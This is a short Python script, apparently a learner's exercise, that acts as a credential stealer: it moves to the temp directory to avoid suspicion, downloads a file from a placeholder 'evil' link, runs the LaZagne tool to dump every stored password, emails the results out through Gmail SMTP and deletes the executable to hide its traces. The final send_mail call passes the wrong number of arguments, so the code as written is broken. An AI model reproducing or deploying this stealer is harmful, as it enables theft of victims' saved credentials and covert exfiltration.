
import smtplib
import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    print("[+] Downloading file...")
    print(get_response.content)

    file_name = url.split("/")[-1]

    path = "/home/suncos/Learning Python/Python Scripts/dowloading_file/"
    with open(f"{path}{file_name}", "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    """This function allows you to send mails from a gmail account"""

    server = smtplib.SMTP("smtp.gmail.com", 587,)
    server.starttls()
    server.login(email, password)

    # (From_email, To_email, content of the mail)
    server.sendmail(email, email, message)
    server.quit()


# Move the program to a temp directory to not look suspicious
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("link to the evil file")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("mail, password", result)
os.remove("laZagne.exe")
